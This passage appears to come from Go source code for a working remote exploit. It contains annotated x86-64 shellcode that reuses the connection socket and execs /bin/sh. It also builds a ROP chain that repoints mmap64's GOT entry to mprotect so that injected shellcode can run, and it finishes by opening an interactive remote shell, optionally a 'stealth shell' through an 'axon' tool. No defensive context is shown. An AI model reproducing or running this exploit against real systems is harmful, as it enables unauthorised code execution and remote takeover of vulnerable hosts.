				0x4c, 0x39, 0xc3, // cmp rbx,r8
				0x74, 0x13, // je 0x1598
				0x4c, 0x89, 0xc1, // mov rcx,r8
				0x48, 0xc1, 0xe1, 0x04, // shl rcx,0x4
				0x49, 0x8b, 0x44, 0x0d, 0x00, // mov rax,QWORD PTR [r13+rcx*1+0x0]
				0x48, 0x39, 0xd0, // cmp rax,rdx
				0x76, 0xe4, // jbe 0x157a
				0xeb, 0x37, // jmp 0x15cf
				0xf0, 0xff, 0x0d, 0xa1, 0x1a, 0x00, 0x00, // lock dec DWORD PTR [rip+0x1aa1] # 0x3040
				0x0f, 0x84, 0x74, 0xfb, 0xff, 0xff, // je 0x1119
				0xc7, 0x05, 0x91, 0x1a, 0x00, 0x00, 0x00, // mov DWORD PTR [rip+0x1a91],0x0 # 0x3040
				0x00, 0x00, 0x00, // 00 00 00
				0x45, 0x31, 0xd2, // xor r10d,r10d
				0xb8, 0xca, 0x00, 0x00, 0x00, // mov eax,0xca
				0x48, 0x8d, 0x3d, 0x82, 0x1a, 0x00, 0x00, // lea rdi,[rip+0x1a82] # 0x3040
				0xbe, 0x81, 0x00, 0x00, 0x00, // mov esi,0x81
				0xba, 0x01, 0x00, 0x00, 0x00, // mov edx,0x1
				0x0f, 0x05, // syscall
				0xe9, 0x4a, 0xfb, 0xff, 0xff, // jmp 0x1119
				0x48, 0x29, 0xd0, // sub rax,rdx
				0x48, 0x01, 0x94, 0x0c, 0x80, 0x00, 0x00, // add QWORD PTR [rsp+rcx*1+0x80],rdx
				0x00, // 00
				0x48, 0x89, 0x84, 0x0c, 0x88, 0x00, 0x00, // mov QWORD PTR [rsp+rcx*1+0x88],rax
				0x00, // 00
				0xe9, 0x56, 0xff, 0xff, 0xff, // jmp 0x153d
			}
		} else {
			shellcode = []byte{
				0x53, // push rbx
				0x41, 0x89, 0xf9, // mov r9d,edi
				0x41, 0x89, 0xf2, // mov r10d,esi
				0x31, 0xff, // xor edi,edi
				0xbb, 0x34, 0x00, 0x00, 0x00, // mov ebx,0x34
				0x48, 0x8d, 0x74, 0x24, 0xe4, // lea rsi,[rsp-0x1c]
				0x48, 0x8d, 0x54, 0x24, 0xe0, // lea rdx,[rsp-0x20]
				0xc7, 0x44, 0x24, 0xe0, 0x1c, 0x00, 0x00, // mov DWORD PTR [rsp-0x20],0x1c
				0x00, // 00
				0x48, 0x89, 0xd8, // mov rax,rbx
				0x0f, 0x05, // syscall
				0x49, 0x89, 0xc0, // mov r8,rax
				0x48, 0x85, 0xc0, // test rax,rax
				0x75, 0x19, // jne 1e7 <release+0x46>
				0x66, 0x83, 0x7c, 0x24, 0xe4, 0x02, // cmp WORD PTR [rsp-0x1c],0x2
				0x75, 0x11, // jne 1e7 <release+0x46>
				0x44, 0x39, 0x4c, 0x24, 0xe8, // cmp DWORD PTR [rsp-0x18],r9d
				0x75, 0x0a, // jne 1e7 <release+0x46>
				0x0f, 0xb7, 0x44, 0x24, 0xe6, // movzx eax,WORD PTR [rsp-0x1a]
				0x44, 0x39, 0xd0, // cmp eax,r10d
				0x74, 0x05, // je 1ec <release+0x4b>
				0x48, 0xff, 0xc7, // inc rdi
				0xeb, 0xcd, // jmp 1b9 <release+0x18>
				0x41, 0xba, 0x48, 0x00, 0x00, 0x00, // mov r10d,0x48
				0x41, 0xb9, 0x02, 0x00, 0x00, 0x00, // mov r9d,0x2
				0xbe, 0x04, 0x00, 0x00, 0x00, // mov esi,0x4
				0x4c, 0x89, 0xd0, // mov rax,r10
				0x4c, 0x89, 0xca, // mov rdx,r9
				0x0f, 0x05, // syscall
				0x4c, 0x89, 0xd0, // mov rax,r10
				0x4c, 0x89, 0xce, // mov rsi,r9
				0x4c, 0x89, 0xc2, // mov rdx,r8
				0x0f, 0x05, // syscall
				0xb8, 0x39, 0x00, 0x00, 0x00, // mov eax,0x39
				0x0f, 0x05, // syscall
				0x85, 0xc0, // test eax,eax
				0x74, 0x0a, // je 225 <release+0x84>
				0xb8, 0xe7, 0x00, 0x00, 0x00, // mov eax,0xe7
				0x4c, 0x89, 0xc7, // mov rdi,r8
				0x0f, 0x05, // syscall
				0xba, 0x21, 0x00, 0x00, 0x00, // mov edx,0x21
				0x4c, 0x89, 0xc6, // mov rsi,r8
				0x48, 0x89, 0xd0, // mov rax,rdx
				0x0f, 0x05, // syscall
				0xbe, 0x01, 0x00, 0x00, 0x00, // mov esi,0x1
				0x48, 0x89, 0xd0, // mov rax,rdx
				0x0f, 0x05, // syscall
				0x48, 0x89, 0xd0, // mov rax,rdx
				0x4c, 0x89, 0xce, // mov rsi,r9
				0x0f, 0x05, // syscall
				0xb8, 0x3b, 0x00, 0x00, 0x00, // mov eax,0x3b
				0x48, 0x8d, 0x3d, 0x08, 0x00, 0x00, 0x00, // lea rdi,[rip+0x8] # 258 <release+0xb7>
				0x4c, 0x89, 0xc6, // mov rsi,r8
				0x4c, 0x89, 0xc2, // mov rdx,r8
				0x0f, 0x05, // syscall
				'/', 'b', 'i', 'n', '/', 's', 'h', 0, // "/bin/sh"
			}
		}
		// pass the sockname as arguments
		sockName := must(unix.Getsockname(fd)).(*unix.SockaddrInet4)
		prefix := append([]byte{0xbf}, sockName.Addr[:]...) // mov edi,sockName.Addr
		prefix = append([]byte{0xbe, (byte)(sockName.Port >> 8), (byte)(sockName.Port & 0xff), 0x00, 0x00}, prefix...) // mov esi,htons(sockName.Port)
		prefix = append(prefix, 0x90, 0x90)
		shellcode = append(prefix, shellcode...)
		shellLen := len(shellcode)
		for i := 0; i < 8-(shellLen%8); i++ {
			// pad it with nops
			shellcode = append(shellcode, 0x90)
		}
		// override the return address with a fancy rop chain
		payload = appendUInt64(payload,
			// modify the low byte of mmap64's address in GOT to make it point to mprotect
			popRAXAddress, 0xe0, // change this to match libc
			popRDIAddress, mmap64GOTAddress,
			addIndirectRDIALAddress,
			// modify the next lowest byte of mmap64's address in GOT to make it point to mprotect
			popRAXAddress, 0x1, // also need to change to match libc
			popRDIAddress, mmap64GOTAddress+1,
			addIndirectRDIALAddress,
			// setup mprotect arguments for mprotect(shellcodeBaseAddress, 0x1000, 0x7)
			popRAXAddress, mmap64GOTAddress,
			popRDXAddress, 0x7,
			popRSIAddress, (((uint64(len(shellcode)) + 4095) / 4096) + 10) * 4096,
			popRDIAddress, shellcodeBaseAddress,
			// call mmap64, which we've rebound to mprotect
			mmap64FuncAddress)
		for i := 0; i < shellLen; i += 8 {
			payload = appendUInt64(payload,
				popRAXAddress, shellcodeBaseAddress+uint64(i),
				popRSIAddress)
			payload = append(payload, shellcode[i:i+8]...)
			payload = appendUInt64(payload, movIndirectRAXRSIAddress)
		}
		// and finally a ret to our shellcode
		payload = appendUInt64(payload, shellcodeBaseAddress)
		return payload
	}, 0)
	// if remoteCrashed {
	// 	panic("somehow the remote died")
	// }
	if useAxon {
		fmt.Printf("starting stealth shell\n")
		environment := append(os.Environ(), fmt.Sprintf("PROXY_FD=%d", fd))
		axonPath := must(exec.LookPath("axon"))
		if err := unix.Exec(axonPath, []string{"axon", "bash"}, environment); err != nil {
			panic(err)
		}
	} else {
		fmt.Printf("starting remote shell\n")
		go func() {
			if err := sendFileLoop(fd, 0); err != nil {
				if err == unix.EINVAL {
					if err := readWriteLoop(fd, 0); err != nil {
						panic(err)
					}
				} else {
					panic(err)
				}
			}
		}()
		if err := sendFileLoop(1, fd); err != nil {
			if err == unix.EINVAL {
				if err := readWriteLoop(1, fd); err != nil {
					panic(err)
				}
			} else {
				panic(err)
			}
		}
	}
}
